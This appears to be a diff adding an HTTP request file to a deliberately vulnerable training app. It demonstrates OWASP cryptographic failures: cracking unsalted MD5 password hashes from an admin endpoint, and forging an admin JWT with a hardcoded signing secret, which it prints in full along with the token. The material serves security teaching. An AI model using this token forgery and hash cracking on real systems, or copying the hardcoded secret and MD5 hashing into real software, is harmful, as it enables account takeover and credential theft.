@@ -1,0 +1,53 @@
+### =============================================================
+### OWASP A02 – Cryptographic Failures
+### =============================================================
+### Two problems:
+###   (a) Passwords are hashed with MD5 (no salt, far too fast)
+###   (b) The JWT secret "aviato-jwt-signing-key-2024-prod!" is hardcoded (appsettings.json)
+### =============================================================
+
+@baseUrl = http://localhost:5218
+
+
+### --- (a) Make an MD5 password hash visible ---
+# 1. Register a new user
+POST {{baseUrl}}/auth/register
+Content-Type: application/json
+
+{
+  "username": "victim",
+  "email": "victim@example.com",
+  "password": "hunter2"
+}
+
+###
+
+### --- (a) Read the MD5 hash from the admin endpoint ---
+# The hash for "hunter2" is: 2ab96390c7dbe3439de74d0c9b0b1767
+# Paste it into https://crackstation.net/ (or hashcat) – it cracks instantly,
+# because unsalted MD5 hashes are precomputed in rainbow tables.
+#
+# ⚠️ If A01 is already fixed, this needs an admin token:
+#    Authorization: Bearer <admin token from 00_setup.http>
+GET {{baseUrl}}/admin/users
+
+###
+
+### --- (b) A self-forged JWT signed with the known secret ---
+# The secret "aviato-jwt-signing-key-2024-prod!" is hardcoded in appsettings.json.
+# Knowing it, an attacker can sign their own admin token on https://jwt.io –
+# no login, no password.
+#
+# Payload (base64url-decoded):
+#   {
+#     "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
+#     "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name": "hacker",
+#     "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "admin"
+#   }
+#
+# This token was self-signed with HMAC-SHA256 and the known secret:
+@forgedAdminToken = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjEiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiaGFja2VyIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiYWRtaW4ifQ.mH6v2tBXUqWFW3M2g5s3uSW1kG83L_MhrU4wokfDo-M
+
+# Use the forged token as admin:
+GET {{baseUrl}}/orders/my
+Authorization: Bearer {{forgedAdminToken}}
